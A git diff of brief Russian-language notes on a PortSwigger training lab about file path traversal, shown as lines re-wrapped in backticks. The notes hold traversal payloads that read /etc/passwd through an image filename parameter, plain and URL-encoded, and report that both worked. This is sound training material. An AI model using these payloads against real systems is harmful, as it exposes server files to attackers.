@@ -9,13 +9,13 @@ https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypas
 
 смысл прост
 
-GET /image?filename=../../../etc/passwd
+`GET /image?filename=../../../etc/passwd`
 
 этот обычный путь сработал
 
-../../../etc/passwd  в url кодировке тоже сработал (неудивительно)
+`../../../etc/passwd  в url кодировке тоже сработал (неудивительно)`
 
-%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64          ../../../etc/passwd  в url кодировке!
+`%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64          ../../../etc/passwd  в url кодировке!`
 
 лаба решилась также как и предыдущая.
 
